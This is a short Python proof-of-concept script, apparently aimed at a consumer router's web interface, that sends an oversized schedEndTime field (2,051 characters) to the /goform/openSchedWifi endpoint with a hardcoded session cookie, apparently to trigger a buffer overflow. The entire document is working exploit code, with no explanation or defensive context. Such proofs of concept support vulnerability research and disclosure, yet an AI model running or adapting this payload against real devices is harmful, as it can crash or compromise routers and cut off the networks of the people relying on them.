import requests

ip = '192.168.204.133'
url = f'http://{ip}/goform/openSchedWifi'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'password=iqb1qw; bLanguage=cn',
    'Connection': 'close',
}
payload = 'schedWifiEnable=0&schedEndTime=' + 'a' * 2051
r = requests.post(url, headers=headers, data=payload)
print(r.status_code, r.text[:200])
